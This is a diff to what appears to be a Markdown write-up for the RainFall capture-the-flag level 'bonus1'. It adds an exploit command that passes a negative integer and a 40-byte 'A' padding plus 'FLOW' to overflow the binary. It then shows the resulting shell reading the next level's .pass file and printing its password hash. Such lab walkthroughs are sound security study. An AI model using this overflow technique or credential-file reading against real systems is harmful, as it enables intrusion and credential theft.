@@ -63,7 +63,13 @@ i r $ecx
 ecx            0x2c	44
 ```
 
+```
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
 
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+```
 
 
 
